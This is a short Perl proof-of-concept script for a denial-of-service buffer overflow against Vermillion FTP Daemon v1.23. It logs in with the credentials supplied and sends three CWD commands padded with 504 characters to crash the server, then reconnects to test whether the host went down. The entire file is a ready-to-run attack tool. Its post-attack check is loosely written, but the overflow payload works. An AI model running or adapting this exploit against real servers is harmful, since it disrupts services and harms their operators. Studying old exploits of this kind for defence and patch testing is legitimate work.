#!/usr/bin/perl

# Example for a possible DOS-attack against Vermillion FTP Daemon (VFTPD) v1.23.
# There need to be 504 characters to overflow Server.
# Example : Trying example.com...
# 	    Connected to example.com.
# 	    Escape character is '^]'.
#	    220 itsme FTP Server (vftpd 1.23) ready.
#           USER itsme
#           PASS ******
#           CWD [504 characters]
#           CWD [504 characters]
#           CWD [504 characters]
#	    Overflow

use IO::Socket;

print "Possible DOS-attack against Vermillion FTP Daemon (VFTPD) v1.23\n";
print "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n";

if (not $ARGV[2]) {
  print "Usage: $0 [host] [user] [pass]\n\n";
  exit(0);
}

sub connecthost {
        $host = IO::Socket::INET->new ( Proto => "tcp",
			                PeerAddr => $ARGV[0],
                			PeerPort => "21",) or die "Can't open connection to $ARGV[0] because $!\n";
        $host->autoflush(1);
} 

$bufferoverflow .= "A" x 504;

print "\nOpen connection...\n";
&connecthost;
print "Sending characters...\n";
print $host "user $ARGV[1]\n";
print $host "pass $ARGV[2]\n";
print $host "cwd $bufferoverflow\n";
print $host "cwd $bufferoverflow\n";
print $host "cwd $bufferoverflow\n";
print "close connection...\n";
close $host;

print "\nTesting...\n";
&connecthost("\nThe host $ARGV[0] is vulnerable to this attack.\n");
close $host;
die "The host $ARGV[0] is not vulnerable to this attack.\n";

# by arbon(arbon@gmx.de)
